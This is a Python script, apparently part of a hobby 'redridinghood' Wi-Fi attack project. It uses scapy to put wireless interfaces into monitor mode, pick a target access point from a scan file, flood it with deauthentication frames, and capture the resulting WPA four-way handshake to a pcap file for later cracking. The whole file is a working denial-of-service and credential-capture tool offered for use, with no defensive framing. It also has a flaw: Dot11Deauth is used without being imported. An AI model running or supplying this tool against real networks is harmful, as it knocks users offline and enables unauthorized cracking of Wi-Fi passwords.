from scapy.all import sniff, Dot11, EAPOL, RadioTap, sendp, wrpcap
import subprocess
from threading import Thread

# Function to read network scan results from file
def read_network_scan_file(scan_file_path):
    """ Reads the network scan results from the file and returns a list of BSSIDs and SSIDs. """
    networks = []
    try:
        with open(scan_file_path, 'r') as f:
            for line in f:
                # Split the line into fields based on whitespace
                fields = line.split()
                if len(fields) >= 4:  # Make sure the line has enough fields (BSSID, Manufacturer, SSID, Channel)
                    bssid = fields[0]
                    ssid = " ".join(fields[2:-1])  # SSID might contain spaces, channel is the last element
                    networks.append((bssid, ssid))
    except Exception as e:
        print(f"[ERROR] Failed to read network scan file: {e}")
    
    return networks

def monitor_mode(iface):
    try:
        subprocess.run(["sudo", "ip", "link", "set", iface, "down"], check=True)
        subprocess.run(["sudo", "iw", "dev", iface, "set", "type", "monitor"], check=True)
        subprocess.run(["sudo", "ip", "link", "set", iface, "up"], check=True)
        print(f"[INFO] {iface} set to monitor mode.")
    except subprocess.CalledProcessError as e:
        print(f"[ERROR] Failed to set {iface} to monitor mode: {e}")

def monitor_off(iface):
    try:
        subprocess.run(["sudo", "ip", "link", "set", iface, "down"], check=True)
        subprocess.run(["sudo", "iw", "dev", iface, "set", "type", "managed"], check=True)
        subprocess.run(["sudo", "ip", "link", "set", iface, "up"], check=True)
        print(f"[INFO] {iface} set to managed mode.")
    except subprocess.CalledProcessError as e:
        print(f"[ERROR] Failed to set {iface} to managed mode: {e}")

def stop_network_manager():
    """ Stops network manager to prevent interference. """
    try:
        subprocess.run(["sudo", "systemctl", "stop", "NetworkManager"], check=True)
        print("[INFO] NetworkManager stopped to avoid interference.")
    except subprocess.CalledProcessError:
        print("[ERROR] Failed to stop NetworkManager.")

def start_network_manager():
    """ Restarts network manager. """
    try:
        subprocess.run(["sudo", "systemctl", "start", "NetworkManager"], check=True)
        print("[INFO] NetworkManager restarted.")
    except subprocess.CalledProcessError:
        print("[ERROR] Failed to restart NetworkManager.")

def listen_for_handshake(handshake_iface, output_file):
    captured_handshake = []

    def packet_handler(packet):
        if packet.haslayer(EAPOL):
            print(f"[INFO] Detected WPA handshake frame from {packet[Dot11].addr2} to {packet[Dot11].addr1}.")
            captured_handshake.append(packet)
            if len(captured_handshake) >= 4:  # Assuming we want at least 4 frames to consider a full handshake.
                return True

    print(f"[INFO] Listening for WPA handshakes on {handshake_iface}...")
    try:
        sniff(iface=handshake_iface, prn=packet_handler, stop_filter=lambda x: len(captured_handshake) >= 4)
        if captured_handshake:
            wrpcap(output_file, captured_handshake)
            print(f"[INFO] Handshake saved to {output_file}.")
        else:
            print("[INFO] No handshake captured.")
    except Exception as e:
        print(f"[ERROR] Error capturing packets: {e}")

def deauth_attack(dos_iface, target_bssid, target_client="FF:FF:FF:FF:FF:FF"):
    """ Function to perform deauthentication attack. """
    print(f"[INFO] Starting deauthentication attack on BSSID {target_bssid} using {dos_iface}...")

    # Crafting deauthentication frame
    dot11 = Dot11(addr1=target_client, addr2=target_bssid, addr3=target_bssid)
    frame = RadioTap()/dot11/Dot11Deauth(reason=7)

    try:
        # Sending deauth frames in a loop
        while True:
            sendp(frame, iface=dos_iface, count=100, inter=0.1, verbose=0)
            print(f"[INFO] Deauth frames sent to {target_client} from {target_bssid}.")
    except KeyboardInterrupt:
        print("[INFO] Stopping deauthentication attack.")
    except Exception as e:
        print(f"[ERROR] Failed to send deauth frames: {e}")

def handshake_main():
    # Get interface input from user
    subprocess.run("ifconfig")
    stop_network_manager()

    handshake_iface = input("Enter the network interface to capture Handshakes: ")
    dos_iface = input("Enter network interface to use for DOS: ")

    # Load network scan results from file
    scan_file = "network_scan_results.txt"
    networks = read_network_scan_file(scan_file)

    # Display the available networks to the user
    print("\nAvailable Networks:")
    for idx, (bssid, ssid) in enumerate(networks):
        print(f"{idx}. BSSID: {bssid}, SSID: {ssid}")

    # Let the user select a network for deauthentication
    network_idx = int(input("\nEnter the number of the network to target for deauthentication: "))
    target_bssid, target_ssid = networks[network_idx]

    print(f"[INFO] Targeting network SSID: {target_ssid}, BSSID: {target_bssid}")

    # Set the output file path for captured handshakes
    output_file = "/home/randompolymath/Desktop/RedRidingHoodCompany/redridinghoodv1/Results/handshakes.pcap"

    # Set the interfaces to monitor mode
    monitor_mode(handshake_iface)
    monitor_mode(dos_iface)

    # Start the deauthentication attack in a parallel process
    try:
        dos_thread = Thread(target=deauth_attack, args=(dos_iface, target_bssid))
        dos_thread.start()

        # Capture handshake on the handshake_iface
        listen_for_handshake(handshake_iface, output_file)
    finally:
        # Stop the DOS thread after capturing handshakes
        dos_thread.join(0)
        start_network_manager()
        monitor_off(handshake_iface)
        monitor_off(dos_iface)

if __name__ == "__main__":
    handshake_main()
